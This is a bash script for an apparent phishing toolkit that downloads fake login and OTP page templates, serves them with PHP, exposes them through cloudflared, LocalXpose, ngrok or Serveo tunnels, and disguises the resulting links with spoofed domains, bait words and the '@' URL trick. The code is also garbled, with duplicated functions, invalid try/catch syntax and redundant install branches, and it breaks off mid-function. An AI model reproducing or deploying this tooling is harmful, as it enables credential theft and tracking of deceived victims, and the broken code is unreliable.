#!/bin/bash

# Function for masking
masking() {
    read -p $'\nWanna try custom link? [y/N/help] : ' cust
    if [[ "$cust" == "" || "$cust" == "n" || "$cust" == "N" || "$cust" == "no" ]]; then
        return
    fi
    if [[ "$cust" == "help" ]]; then
        echo "$curl_help"
    fi

    shortened=""
    shortened=$(shortener1 "$url")
    if [[ "$shortened" == "" ]]; then
        shortened=$(shortener2 "$url")
    fi
    if [[ "$shortened" == "" ]]; then
        shortened=$(shortener3 "$url")
    fi

    if [[ "$shortened" == "" ]]; then
        echo "Service not available!"
        waiter
        return
    fi

    short="${shortened//https:\/\/}"
    read -p $'\nEnter custom domain(Example: google.com, yahoo.com): ' domain

    if [[ "$domain" == "" ]]; then
        echo -e "\nNo domain!"
        domain="https://"
    else
        domain="https://$(echo "$domain" | sed -E 's|[/%+&?={} ]|.|g; s|https?://||')"
    fi

    read -p $'\nEnter bait words with hyphen without space (Example: free-money, pubg-mod): ' bait

    if [[ "$bait" == "" ]]; then
        echo -e "\nNo bait word!"
        if [[ "$domain" != "https://" ]]; then
            bait="@"
        fi
    else
        if [[ "$domain" != "https://" ]]; then
            bait="-$(echo "$bait" | sed -E 's|[/%+&?={} ]|-|g')@"
        else
            bait="$(echo "$bait" | sed -E 's|[/%+&?={} ]|-|g')@"
        fi
    fi

    final="$domain$bait$short"
    echo

    title="[bold blue]Custom[/]"
    text="[cyan]URL[/] [green]:[/] [yellow]$final[/]"

    cprint() {
        panel_text="$1"
        panel_title="$2"
        panel_title_align="$3"
        panel_border_style="$4"
        echo -e "$panel_text"
    }

    cprint "$(cprint "$text" "$title" "left" "blue")"
}

# Function for updating fnck_cloudflare_tunnelz
updater() {
    internet
    if [[ ! -f "files/fnck_cloudflare_tunnelz.gif" ]]; then
        return
    fi

    toml_data=$(get "https://raw.githubusercontent.com/hackryan/fnck_cloudflare_tunnelz/main/files/pyproject.toml" | text)
    pattern='version\s*=\s*"([^"]+)"'
    if [[ "$toml_data" =~ $pattern ]]; then
        gh_ver="${BASH_REMATCH[1]}"
    else
        gh_ver="404: Not Found"
    fi

    if [[ "$gh_ver" != "404: Not Found" && $(get_ver "$gh_ver") -gt $(get_ver "$version") ]]; then
        changelog=$(get "https://raw.githubusercontent.com/hackryan/fnck_cloudflare_tunnelz/main/files/changelog.log" | text | awk 'BEGIN{RS="\n\n\n";ORS="\n\n\n"}{print;exit}')
        clear --fast
        echo -e "${info}fnck_cloudflare_tunnelz has a new update!\n${info2}Current: ${red}$version\n${info}Available: ${green}$gh_ver"
        read -p $'\nDo you want to update fnck_cloudflare_tunnelz? [y/n] > ' upask
        if [[ "$upask" == "y" ]]; then
            echo
            cd ..
            rm -rf fnck_cloudflare_tunnelz fnck_cloudflare_tunnelz
            git clone "$repo_url"
            echo -e "\n${success}fnck_cloudflare_tunnelz has been updated successfully!! Please restart terminal!"
            if [[ "$changelog" != "404: Not Found" ]]; then
                echo -e "\n${info2}Changelog:\n${purple}$changelog"
            fi
            exit
        elif [[ "$upask" == "n" ]]; then
            echo -e "\n${info}Updating cancelled. Using old version!"
            sleep 2
        else
            echo -e "\n${error}Wrong input!\n"
            sleep 2
        fi
    fi
}

# Function for installing packages and downloading tunnelers
requirements() {
    termux=false
    cf_command=""
    lx_command=""
    is_mail_ok=false
    email=""
    password=""
    receiver=""

    # Termux may not have permission to write in saved_file.
    # So we check if /sdcard is readable.
    # If not, execute termux-setup-storage to prompt user to allow
    for retry in {1..2}; do
        if [[ ! -d "$default_dir" ]]; then
            mkdir "$default_dir"
        fi

        if [[ "$termux" == true ]]; then
            if [[ ! -f "$saved_file" ]]; then
                touch "$saved_file"
            fi
            data=$(cat "$saved_file")
        fi

        if [[ "$termux" == true && "$data" == "" ]]; then
            shell "termux-setup-storage"
        fi

        if [[ "$termux" == true ]]; then
            if [[ -f "$saved_file" ]]; then
                data=$(cat "$saved_file")
            fi
        fi

        if [[ "$termux" == true && "$retry" == "1" ]]; then
            echo -e "\n${error}You haven't allowed storage permission for Termux. Closing fnck_cloudflare_tunnelz!\n"
            sleep 2
            pexit
        fi
    done

    internet

    if [[ "$termux" == true ]]; then
        if ! is_installed "proot"; then
            echo -e "\n${info}Installing proot${nc}"
            shell "pkg install proot -y"
        fi
    fi

    installer "php"

    if is_installed "apt" && ! is_installed "pkg"; then
        installer "ssh" "openssh-client"
    else
        installer "ssh" "openssh"
    fi

    for package in "${packages[@]}"; do
        if ! is_installed "$package"; then
            echo -e "${error}$package cannot be installed. Install it manually!${nc}"
            exit 1
        fi
    done

    killer

    osinfo=$(uname)

    platform=$(echo "$osinfo" | awk '{print tolower($1)}')
    architecture=$(echo "$osinfo" | awk '{print $2}')

    iscloudflared=false
    isloclx=false

    delete "cloudflared.tgz" "cloudflared" "loclx.zip"

    internet

    if [[ "linux" == *"$platform"* ]]; then
        if [[ "arm64" == *"$architecture"* || "aarch64" == *"$architecture"* ]]; then
            if [[ "$iscloudflared" == false ]]; then
                download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" "$tunneler_dir/cloudflared"
            fi
            if [[ "$isloclx" == false ]]; then
                download "https://github.com/hackryan2/maxfiles/releases/download/tunnelers/loclx-linux-arm64.zip" "loclx.zip"
            fi
        elif [[ "arm" == *"$architecture"* ]]; then
            if [[ "$iscloudflared" == false ]]; then
                download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm" "$tunneler_dir/cloudflared"
            fi
            if [[ "$isloclx" == false ]]; then
                download "https://github.com/hackryan2/maxfiles/releases/download/tunnelers/loclx-linux-arm.zip" "loclx.zip"
            fi
        elif [[ "x86_64" == *"$architecture"* || "amd64" == *"$architecture"* ]]; then
            if [[ "$iscloudflared" == false ]]; then
                download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64" "$tunneler_dir/cloudflared"
            fi
            if [[ "$isloclx" == false ]]; then
                download "https://github.com/hackryan2/maxfiles/releases/download/tunnelers/loclx-linux-amd64.zip" "loclx.zip"
            fi
        else
            if [[ "$iscloudflared" == false ]]; then
                download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" "$tunneler_dir/cloudflared"
            fi
            if [[ "$isloclx" == false ]]; then
                download "https://github.com/hackryan2/maxfiles/releases/download/tunnelers/loclx-linux-386.zip" "loclx.zip"
            fi
        fi
    elif [[ "darwin" == *"$platform"* ]]; then
        if [[ "x86_64" == *"$architecture"* || "amd64" == *"$architecture"* ]]; then
            if [[ "$iscloudflared" == false ]]; then
                download "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" "cloudflared.tgz"
                extract "cloudflared.tgz" "$tunneler_dir"
            fi
            if [[ "$isloclx" == false ]]; then
                download "https://github.com/hackryan2/maxfiles/releases/download/tunnelers/loclx-darwin-amd64.zip" "loclx.zip"
            fi
        elif [[ "arm64" == *"$architecture"* || "aarch64" == *"$architecture"* ]]; then
            if [[ "$iscloudflared" == false ]]; then
                echo "${error}Device architecture unknown. Download cloudflared manually!"
            fi
            if [[ "$isloclx" == false ]]; then
                download "https://github.com/hackryan2/maxfiles/releases/download/tunnelers/loclx-darwin-arm64.zip" "loclx.zip"
            fi
        else
            echo "${error}Device architecture unknown. Download cloudflared/loclx manually!"
            sleep 3
        fi
    else
        echo "${error}Device not supported!"
        exit 1
    fi

    if [[ -f "$tunneler_dir/cloudflared" ]]; then
        chmod +x "$HOME/.tunneler/cloudflared"
    fi

    if [[ -f "$tunneler_dir/loclx" ]]; then
        chmod +x "$HOME/.tunneler/loclx"
    fi

    for process in "${processes[@]}"; do
        if is_running "$process"; then
            echo -e "\n${error}Previous $process still running! Please restart terminal and try again${nc}"
            pexit
        fi
    done

    if is_installed "cloudflared"; then
        cf_command="cloudflared"
    fi

    if is_installed "localxpose"; then
        lx_command="localxpose"
    fi

    if [[ -f "websites.zip" ]]; then
        delete "$sites_dir" --recreate
        echo -e "\n${info}Copying website files...."
        extract "websites.zip" "$sites_dir"
        remove "websites.zip"
    fi

    if [[ -d "sites" ]]; then
        echo -e "\n${info}Copying website files...."
        cp -r "sites" "$sites_dir"
    fi

    if [[ -f "$sites_dir/version.txt" ]]; then
        zipver=$(cat "$sites_dir/version.txt" | sed 's/[^0-9.]//g')
        if [[ $(get_ver "$version") -gt $(get_ver "$zipver") ]]; then
            echo -e "\n${info2}Downloading website files....${nc}"
            delete "$sites_dir"
            shell "git clone $sites_repo $sites_dir"
        fi
    else
        echo -e "\n${info2}Downloading website files....${nc}"
        shell "git clone $sites_repo $sites_dir"
    fi

    if [[ -f "maxsites.zip" ]]; then
        extract "maxsites.zip" ".tempdir"
        delete "maxsites.zip"
        cp -r ".tempdir/$repo_branch" "$sites_dir"
        delete ".tempdir"
    fi

    if [[ -f "websites.zip" ]]; then
        delete "$sites_dir"
        extract "websites.zip" "$sites_dir"
        remove "websites.zip"
    fi

    if [[ "$mode" != "test" ]]; then
        lx_token
        ssh_key
    fi

    email_config=$(cat "$email_file")

    if is_json "$email_config"; then
        email_json=$(parse "$email_config")
        email="${email_json["email"]}"
        password="${email_json["password"]}"
        receiver="${email_json["receiver"]}"
        if [[ "$email" == *@gmail.com ]]; then
            is_mail_ok=true
        else
            echo -e "\n${error}Only Gmail with app password is allowed!${nc}"
            sleep 1
        fi
    fi
}

# Main Menu to choose phishing type
main_menu() {
    termux=false
    ptype=""
    mode=""
    troubleshoot=""
    option=""
    mask=""
    redir_url=""

    shell "stty -echoctl" # Skip printing ^C

    if [[ "$update" == true ]]; then
        updater
    fi

    requirements

    if [[ "$troubleshoot" == "${ts_commands["troubleshoot"]}" ]]; then
        command="${ts_commands["troubleshoot"]}"
        shell "$command"
        pexit
    fi

    while true; do
        tempdata=$(cat "$templates_file")

        if is_json "$tempdata"; then
            templates=$(parse "$tempdata")
        else
            echo -e "\n${error}templates.json file is corrupted!"
            exit 1
        fi

        names=("${!templates[@]}")
        choices=()

        for ((i = 1; i <= ${#names[@]}; i++)); do
            choices+=("$i")
        done

        clear

        if [[ -n "$ptype" ]]; then
            choice="$ptype"
        elif [[ "$mode" == "test" ]]; then
            choice="$default_type"
        else
            echo -e "\n${ask}Select one of the options:"
            show_options "${names[@]}"
            choice=""
            read -p "> " choice
        fi

        if [[ "$choice" != "0" && "$choice" == 0* ]]; then
            choice="${choice#0}"
        fi

        if [[ "${choices[@]}" =~ "$choice" ]]; then
            index=$((choice - 1))
            phishing_type="${names[$index]}"
            secondary_menu "${templates[$phishing_type]}" "$phishing_type"
        elif [[ "$choice" == "a" ]]; then
            about
        elif [[ "$choice" == "o" ]]; then
            add_zip
        elif [[ "$choice" == "s" ]]; then
            saved
        elif [[ "$choice" == "m" ]]; then
            bgtask "xdg-open 'https://github.com/hackryan/hackryan#My-Best-Works'"
        elif [[ "$choice" == "0" ]]; then
            pexit
        else
            echo -e "\n${error}Wrong input '$choice'"
            ptype=""
        fi
    done
}

# Choose a template
secondary_menu() {
    local sites
    local name
    local customdir
    local otp_folder
    local names
    local choices
    local site

    sites=("$1")
    name="$2"
    customdir=""
    otp_folder=""
    names=()
    choices=()

    for site in "${sites[@]}"; do
        names+=("${site["name"]}")
    done

    for ((i = 1; i <= ${#names[@]}; i++)); do
        choices+=("$i")
    done

    while true; do
        clear

        if [[ "${#sites[@]}" -gt 1 ]]; then
            echo -e "\n${ask}Select one of the options:"
            show_options "${names[@]}" false true
        else
            site=("${sites[0]}")
            folder="${site["folder"]}"

            if [[ "${site["mask"]+isset}" ]]; then
                mask="${site["mask"]}"
            fi

            if [[ "${site["redirect"]+isset}" ]]; then
                redir_url="${site["redirect"]}"
            fi

            break
        fi

        if [[ -n "$option" ]]; then
            choice="$option"
        elif [[ "$mode" == "test" ]]; then
            choice="$default_template"
        else
            echo -e "\n${ask}Select one of the options:"
            read -p "> " choice
        fi

        if [[ "$choice" != "0" && "$choice" == 0* ]]; then
            choice="${choice#0}"
        fi

        if [[ "${choices[@]}" =~ "$choice" ]]; then
            index=$((choice - 1))
            site=("${sites[$index]}") # Lists start from 0 but our index starts from 1
            folder="${site["folder"]}"

            if [[ "${site["otp_folder"]+isset}" ]]; then
                otp_folder="${site["otp_folder"]}"
            fi

            if [[ "${site["mask"]+isset}" ]]; then
                mask="${site["mask"]}"
            fi

            if [[ "${site["redirect"]+isset}" ]]; then
                redir_url="${site["redirect"]}"
            fi

            if [[ "$folder" == "custom" && "$mask" == "custom" ]]; then
                customdir="$(customfol)"
            fi

            if [[ -n "$otp_folder" ]]; then
                read -p "${ask}Do you want OTP Page? [y/n] > ${green}" is_otp

                if [[ "$is_otp" == "y" ]]; then
                    folder="$otp_folder"
                fi
            fi

            break
        elif [[ "$choice" == "a" ]]; then
            about
        elif [[ "$choice" == "o" ]]; then
            add_zip
        elif [[ "$choice" == "s" ]]; then
            saved
        elif [[ "$choice" == "x" ]]; then
            return
        elif [[ "$choice" == "0" ]]; then
            pexit
        else
            echo -e "\n${error}Wrong input '$choice'"
            option=""
        fi
    done

    if [[ -z "$customdir" ]]; then
        site="$sites_dir/$folder"

        if [[ ! -d "$site" ]]; then
            internet
            delete "site.zip"
            download "https://github.com/hackryan/files/raw/main/phishingsites/$folder.zip" "site.zip"
            extract "site.zip" "$site"
            remove "site.zip"
        fi

        copy "$site" "$site_dir"

        if [[ "$name" == "Login" ]]; then
            set_login
        fi

        if [[ "$name" == "Image" ]]; then
            set_image
        fi

        if [[ "$name" == "ClipBoard" ]]; then
            set_redirect "$redir_url" true
        fi

        if [[ "$name" == "Video" || "$name" == "Audio" ]]; then
            set_duration
        fi

        if [[ "$name" == "Location" || "$name" == "IP Tracker" || "$name" == "Device" ]]; then
            set_redirect "$redir_url"
        fi
    fi

    server
}

# Start server and tunneling
server() {
    local cf_success
    local cf_url
    local lx_success
    local lx_url
    local lhr_success
    local lhr_url
    local svo_success
    local svo_url

    termux=false

    clear

    # Termux requires hotspot in some Android versions
    if [[ "$termux" == true ]]; then
        echo -e "\n${info}If you haven't enabled hotspot, please enable it!"
        sleep 2
    fi

    echo -e "\n${info2}Initializing PHP server at localhost:$port...."

    for logfile in "$php_file" "$cf_file" "$lx_file" "$lhr_file" "$svo_file"; do
        delete "$logfile"

        if [[ ! -f "$logfile" ]]; then
            mknod "$logfile"
        fi
    done

    php_log="$php_file"
    cf_log="$cf_file"
    lx_log="$lx_file"
    lhr_log="$lhr_file"
    svo_log="$svo_file"

    internet

    bgtask "php -S 0.0.0.0:$port -t '$site_dir' 2>&1 | tee '$php_log'" "$php_log" &

    if [[ "$mode" != "test" ]]; then
        bgtask "php -S 0.0.0.0:$port -t '$site_dir' 2>&1 | tee '$php_log'" "$php_log" &
    else
        bgtask "php -S 0.0.0.0:$port -t '$site_dir' 2>&1 | tee '$php_log'" "$php_log"
    fi

    # Select a Tunneler
    # Auto tunneling with Loclx and cloudflared
    if [[ -n "$mask" && "$mask" != "custom" ]]; then
        set_tunnel_auto
    else
        while true; do
            clear
            echo -e "\n${ask}Select a Tunneler:"
            show_options "${tunnelers[@]}"
            read -p "> " choice

            if [[ "${tunnelers[@]}" =~ "$choice" ]]; then
                break
            elif [[ "$choice" == "0" ]]; then
                pexit
            elif [[ "$choice" == "x" ]]; then
                return
            elif [[ "$choice" == "a" ]]; then
                about
            elif [[ "$choice" == "o" ]]; then
                add_zip
            elif [[ "$choice" == "s" ]]; then
                saved
            else
                echo -e "\n${error}Wrong input '$choice'"
            fi
        done

        case "$choice" in
            1)
                if is_installed "cloudflared" || [[ -f "$HOME/.tunneler/cloudflared" ]]; then
                    set_tunnel_auto
                else
                    echo -e "\n${error}Cloudflared is not installed! Please install it manually or select another Tunneler."
                    sleep 2
                    server
                fi
                ;;
            2)
                if is_installed "localxpose" || [[ -f "$HOME/.tunneler/loclx" ]]; then
                    set_tunnel_manual "localxpose"
                else
                    echo -e "\n${error}Localxpose is not installed! Please install it manually or select another Tunneler."
                    sleep 2
                    server
                fi
                ;;
            3)
                set_tunnel_manual "ngrok"
                ;;
            4)
                set_tunnel_manual "serveo"
                ;;
        esac
    fi
}

# Set tunnel with Cloudflare
set_tunnel_auto() {
    mask_dir=""
    otp=""
    subdomain=""
    uuid=""

    if [[ -n "$mask" && "$mask" != "custom" ]]; then
        mask_dir="$site_dir/$mask"
    elif [[ -n "$mask" && "$mask" == "custom" ]]; then
        mask_dir="$site_dir/$customdir"
    fi

    if [[ -n "$mask_dir" ]]; then
        # Create a subdomain with custom link
        internet
        subdomain=$(generate_subdomain)
        cf_success=false

        # Test for connectivity to cloudflared servers
        if is_installed "cloudflared"; then
            cf_server_test=$(cloudflared tunnel list | awk 'NR==2' | awk '{print $1}')
            if [[ "$cf_server_test" == "ERROR" || "$cf_server_test" == "error" || "$cf_server_test" == "Error" ]]; then
                cf_server_test=""
            fi
        else
            if [[ -f "$HOME/.tunneler/cloudflared" ]]; then
cf_server_test=$(~/.tunneler/cloudflared tunnel list | awk 'NR==2' | awk '{print $1}')
if [[ "$cf_server_test" == "ERROR" || "$cf_server_test" == "error" || "$cf_server_test" == "Error" ]]; then
cf_server_test=""
fi
fi
fi
    if [[ -n "$cf_server_test" ]]; then
        # Check if subdomain is available
        cf_check_subdomain=$(cloudflared tunnel list | grep "$subdomain" | awk '{print $1}')
        if [[ -n "$cf_check_subdomain" ]]; then
            subdomain=""
        else
            # Create tunnel with custom subdomain
            internet
            bgtask "cloudflared tunnel --hostname '$subdomain' --url 'http://localhost:$port' 2>&1" "$cf_log" &

            sleep 10

            # Verify if the tunnel was successfully created
            for i in {1..10}; do
                cf_url=$(grep -Eo 'https://[-0-9a-z.]*\.trycloudflare.com' "$cf_log")

                if [[ -n "$cf_url" ]]; then
                    cf_success=true
                    break
                fi

                sleep 1
            done

            if [[ "$cf_success" == true ]]; then
                echo -e "\n${info}CloudFlare tunnel has been successfully created!"
                url_manager "$cf_url" "CloudFlare"
            else
                echo -e "\n${error}Failed to create a tunnel with CloudFlare!"
                sleep 2
            fi
        fi
    else
        echo -e "\n${error}Unable to connect to CloudFlare servers!"
        sleep 2
    fi
else
    server
fi

waiter
}

set_tunnel_manual() {
local tunneler="$1"
if [[ "$tunneler" == "localxpose" ]]; then
    local arguments="--raw-mode http --https-redirect"

    if [[ -n "$region" ]]; then
        arguments="$arguments --region $region"
    fi

    if [[ -n "$subdomain" ]]; then
        arguments="$arguments --subdomain $subdomain"
    fi

    internet
    bgtask "$HOME/.tunneler/loclx tunnel $arguments -t 'http://localhost:$port' 2>&1" "$lx_log" &
    sleep 10
    lx_url="https://$(grep -Eo '[-0-9a-z.]*\.loclx.io' "$lx_log")"

    if [[ -n "$lx_url" && "$lx_url" != "https://" ]]; then
        echo -e "\n${info}LocalXpose tunnel has been successfully created!"
        url_manager "$lx_url" "LocalXpose"
    else
        echo -e "\n${error}Failed to create a tunnel with LocalXpose!"
        sleep 2
    fi
elif [[ "$tunneler" == "ngrok" ]]; then
    local arguments=""

    if [[ -n "$subdomain" ]]; then
        arguments="-subdomain=$subdomain"
    fi

    if [[ -n "$region" ]]; then
        arguments="$arguments -region $region"
    fi

    internet
    bgtask "$HOME/.tunneler/ngrok http -bind-tls=true $arguments $port 2>&1" "$lhr_log" &
    sleep 10
    lhr_url="https://$(grep -Eo 'https://[0-9a-z.]*.ngrok.io' "$lhr_log")"

    if [[ -n "$lhr_url" && "$lhr_url" != "https://" ]]; then
        echo -e "\n${info}LocalHostRun tunnel has been successfully created!"
        url_manager "$lhr_url" "LocalHostRun"
    else
        echo -e "\n${error}Failed to create a tunnel with LocalHostRun!"
        sleep 2
    fi
elif [[ "$tunneler" == "serveo" ]]; then
    internet
    bgtask "ssh -R 80:localhost:$port serveo.net -T -n 2>&1" "$svo_log" &
    sleep 10
    svo_url="https://$(grep -Eo 'https://[0-9a-z.]*.serveo.net' "$svo_log")"

    if [[ -n "$svo_url" && "$svo_url" != "https://" ]]; then
        echo -e "\n${info}Serveo tunnel has been successfully created!"
        url_manager "$svo_url" "Serveo"
    else
        echo -e "\n${error}Failed to create a tunnel with Serveo!"
        sleep 2
    fi
fi

waiter
}
url_manager() {
local url="$1"
local tunneler="$2"
if [[ "$mask" != "custom" ]]; then
    masking "$url" "$tunneler"
else
    echo -e "\n${info}Your custom URL is: ${bcyan}$url${nc}"
fi
}
masking() {
local url="$1"
local tunneler="$2"
local cust=""
local shortened=""
local short=""
local domain=""
local bait=""
local final=""

read -p $'\n'"$ask${bcyan}Wanna try custom link? ${green}[${blue}y/N/help${green}] : ${yellow}" cust

if [[ -z "$cust" || "$cust" == "n" || "$cust" == "N" || "$cust" == "no" ]]; then
    return
elif [[ "$cust" == "help" ]]; then
    print_curl_help
fi

internet

if [[ -n "$url" ]]; then
    shortened="$url"
elif [[ -n "$mask" && "$mask" != "custom" ]]; then
    if [[ "$tunneler" == "CloudFlare" ]]; then
        shortened="$cf_url"
    elif [[ "$tunneler" == "LocalXpose" ]]; then
        shortened="$lx_url"
    elif [[ "$tunneler" == "LocalHostRun" ]]; then
        shortened="$lhr_url"
    elif [[ "$tunneler" == "Serveo" ]]; then
        shortened="$svo_url"
    fi
elif [[ -n "$mask" && "$mask" == "custom" ]]; then
    if [[ "$tunneler" == "CloudFlare" ]]; then
        shortened="$cf_url"
    elif [[ "$tunneler" == "LocalXpose" ]]; then
        shortened="$lx_url"
    elif [[ "$tunneler" == "LocalHostRun" ]]; then
        shortened="$lhr_url"
    elif [[ "$tunneler" == "Serveo" ]]; then
        shortened="$svo_url"
    fi
else
    echo -e "\n${error}Service not available!"
    waiter
fi

if [[ -n "$shortened" ]]; then
    short="${shortened#https://}"
fi

read -p $'\n'"$ask${bcyan}Enter custom domain (Example: google.com, yahoo.com) > " domain

if [[ -z "$domain" ]]; then
    echo -e "\n${error}No domain!"
    domain="https://"
else
    domain="https://$(echo "$domain" | sed -E 's/[/%+&?={} ]/\./g; s/https?:\/\///')"
fi

read -p $'\n'"$ask${bcyan}Enter bait words with hyphen without space (Example: free-money, pubg-mod) > " bait

if [[ -z "$bait" ]]; then
    echo -e "\n${error}No bait word!"
    if [[ "$domain" != "https://" ]]; then
        bait="@"
    fi
else
    if [[ "$domain" != "https://" ]]; then
        bait="-$(echo "$bait" | sed -E 's/[/%+&?={} ]/-/g')@"
    else
        bait="$(echo "$bait" | sed -E 's/[/%+&?={} ]/-/g')@"
    fi
fi

final="$domain$bait$short"

echo
title="[bold blue]Custom[/]"
text="[cyan]URL[/] [green]:[/] [yellow]$final[/]"
cprint "$(panel "$text" "$title" "left" "blue")"
}
updater() {
internet
if [[ ! -f "files/fnck_cloudflare_tunnelz.gif" ]]; then
    return
fi

local gh_ver=""

try {
    local toml_data="$(get "https://raw.githubusercontent.com/hackryan/fnck_cloudflare_tunnelz/main/files/pyproject.toml" 2>&1)"

    local pattern='version\s*=\s*"([^"]+)"'
    local match

    if [[ "$toml_data" =~ $pattern ]]; then
        gh_ver="${BASH_REMATCH[1]}"
    else
        gh_ver="404: Not Found"
    fi
} 

catch {
    append "$error" "$error_file"
    gh_ver="$version"
}

if [[ "$gh_ver" != "404: Not Found" && $(get_ver "$gh_ver") -gt $(get_ver "$version") ]]; then
    local changelog=""

    # Changelog of each version is separated by three empty lines
    changelog="$(get "https://raw.githubusercontent.com/hackryan/fnck_cloudflare_tunnelz/main/files/changelog.log" | awk -v RS= '/./' | sed -e 's/^/- /g' -e 's/$/\n/g' | sed -e '$!N; /^\(.*\)\n\1$/!P; D')"

    clear_fast

    echo -e "\n${info}${yellow}fnck_cloudflare_tunnelz has a new update!"
    echo -e "${info2}Current: ${red}$version"
    echo -e "${info}Available: ${green}$gh_ver"
    read -p $'\n'"$ask${bcyan}Do you want to update fnck_cloudflare_tunnelz? [y/n] > ${green}" upask

    if [[ "$upask" == "y" ]]; then
        echo
        clear_fast

        cd ..
        rm -rf fnck_cloudflare_tunnelz fnck_cloudflare_tunnelz
        git clone "$repo_url"

        echo -e "\n${success}fnck_cloudflare_tunnelz has been updated successfully! Please restart your terminal."

        if [[ "$changelog" != "404: Not Found" ]]; then
            echo -e "\n${info2}Changelog:"
            echo -e "${purple}$changelog"
        fi

        exit
    elif [[ "$upask" == "n" ]]; then
        echo -e "\n${info}Updating cancelled. Using the old version!"
        sleep 2
    else
        echo -e "\n${error}Wrong input!\n"
        sleep 2
    fi
fi

}

requirements() {
local termux=""
local cf_command=""
local lx_command=""
local is_mail_ok=""
local email=""
local password=""
local receiver=""
# Termux may not have permission to write in saved_file.
# So we check if /sdcard is readable.
# If not, execute termux-setup-storage to prompt the user to allow.
for retry in {1..2}; do
    try {
        if [[ ! -d "$default_dir" ]]; then
            mkdir "$default_dir"
        fi

        if [[ -n "$termux" ]]; then
            apt update -y
            apt upgrade -y
            apt install git -y
            apt install python -y
            apt install python2 -y
            apt install wget -y
            apt install curl -y
            apt install php -y
            apt install ruby -y
            apt install unzip -y
            apt install zip -y
            apt install nano -y
            apt install vim -y
            apt install proot -y
            apt install neofetch -y
            apt install nodejs -y
            apt install python3-pip -y
            apt install php-apache -y
            apt install tsu -y
            apt install openssh -y

            for pip in "${pip_pkgs[@]}"; do
                pip install "$pip"
            done

            if [[ "$os" == "Darwin" ]]; then
                brew install wget
                brew install curl
            fi
        elif [[ -z "$termux" ]]; then
            if [[ -n "$wsl" ]]; then
                clear
                echo -e "\n${info2}Please make sure you have Ubuntu 20.04 or later installed from the Microsoft Store. If you're using an older version of WSL, you may encounter issues."
                echo -e "${warning}Do you want to continue with the installation? (y/n)"
                read -p "> " termux

                if [[ "$termux" == "n" ]]; then
                    echo -e "\n${error}Installation cancelled!"
                    exit
                fi
            fi

            echo -e "\n${info2}Starting package installation..."

            if [[ "$os" == "Linux" ]]; then
                if [[ -n "$termux" ]]; then
                    apt-get update -y
                    apt-get upgrade -y
                    apt-get install git -y
                    apt-get install python -y
                    apt-get install python2 -y
                    apt-get install wget -y
                    apt-get install curl -y
                    apt-get install php -y
                    apt-get install ruby -y
                    apt-get install unzip -y
                    apt-get install zip -y
                    apt-get install nano -y
                    apt-get install vim -y
                    apt-get install proot -y
                    apt-get install neofetch -y
                    apt-get install nodejs -y
                    apt-get install python3-pip -y
                    apt-get install php-apache -y

                    if [[ "$os_codename" == "bionic" || "$os_codename" == "focal" ]]; then
                        apt-get install tsu -y
                        apt-get install openssh -y
                    fi

                    for pip in "${pip_pkgs[@]}"; do
                        pip install "$pip"
                    done
                elif [[ -n "$apt" ]]; then
                    apt update -y
                    apt upgrade -y
                    apt install git -y
                    apt install python -y
                    apt install python2 -y
                    apt install wget -y
                    apt install curl -y
                    apt install php -y
                    apt install ruby -y
                    apt install unzip -y
                    apt install zip -y
                    apt install nano -y
                    apt install vim -y
                    apt install proot -y
                    apt install neofetch -y
                    apt install nodejs -y
                    apt install python3-pip -y
                    apt install php-apache -y

                    if [[ "$os_codename" == "bionic" || "$os_codename" == "focal" ]]; then
                        apt install tsu -y
                        apt install openssh -y
                    fi

                    for pip in "${pip_pkgs[@]}"; do
                        pip install "$pip"
                    done
                elif [[ -n "$yum" ]]; then
                    yum update -y
                    yum install git -y
                    yum install python -y
                    yum install python2 -y
                    yum install wget -y
                    yum install curl -y
                    yum install php -y
                    yum install ruby -y
                    yum install unzip -y
                    yum install zip -y
                    yum install nano -y
                    yum install vim -y
                    yum install proot -y
                    yum install neofetch -y
                    yum install nodejs -y
                    yum install python3-pip -y
                    yum install httpd -y

                    if [[ "$os_codename" == "bionic" || "$os_codename" == "focal" ]]; then
                        yum install tsu -y
                        yum install openssh -y
                    fi

                    for pip in "${pip_pkgs[@]}"; do
                        pip install "$pip"
                    done

                    if [[ -n "$apt" ]]; then
                        apt update -y
                        apt upgrade -y
                        apt install git -y
                        apt install python -y
                        apt install python2 -y
                        apt install wget -y
                        apt install curl -y
                        apt install php -y
                        apt install ruby -y
                        apt install unzip -y
                        apt install zip -y
                        apt install nano -y
                        apt install vim -y
                        apt install proot -y
                        apt install neofetch -y
                        apt install nodejs -y
                        apt install python3-pip -y
                        apt install php-apache -y

                        if [[ "$os_codename" == "bionic" || "$os_codename" == "focal" ]]; then
                            apt install tsu -y
                            apt install openssh -y
                        fi

                        for pip in "${pip_pkgs[@]}"; do
                            pip install "$pip"
                        done
                    fi
                fi
            elif [[ "$os" == "Darwin" ]]; then
                if [[ -n "$brew" ]]; then
                    brew update
                    brew install git
                    brew install python
                    brew install python2
                    brew install wget
                    brew install curl
                    brew install php
                    brew install ruby
                    brew install unzip
                    brew install zip
                    brew install nano
                    brew install vim
                    brew install neofetch
                    brew install node
                    brew install python@3.9
                    brew install php@7.4

                    for pip in "${pip_pkgs[@]}"; do
                        pip install "$pip"
                    done
                fi
            fi
        fi
    } catch {
        append "$error" "$error_file"

        if [[ -n "$wsl" ]]; then
            echo -e "\n${error}An error occurred during installation! Check your internet connection and try again."
            echo -e "${info2}If you continue to experience issues, please try installing manually by following the instructions in the documentation: ${cyan}https://github.com/hackryan/fnck_cloudflare_tunnelz/wiki/Manual-Installation"
        else
            echo -e "\n${error}An error occurred during installation! Check your internet connection and try again."
            echo -e "${info2}If you continue to experience issues, please try installing manually by following the instructions in the documentation: ${cyan}https://github.com/hackryan/fnck_cloudflare_tunnelz/wiki/Manual-Installation"
        fi

        exit
    }

    if [[ "$os" == "Darwin" ]]; then
        break
    fi
done

clear_fast

echo -e "\n${info}${green}Required packages have been successfully installed!"
echo -e "${info2}Downloading and configuring tunnelers..."

# CloudFlare tunnel
if [[ ! -f "$HOME/.tunneler/cloudflared" ]]; then
    internet
    echo -e "${info2}Downloading CloudFlare tunnel..."

    try {
        curl -o "$HOME/.tunneler/cloudflared" -L "$cf_url" 2>/dev/null
        chmod +x "$HOME/.tunneler/cloudflared"
    } catch {
        append "$error" "$error_file"
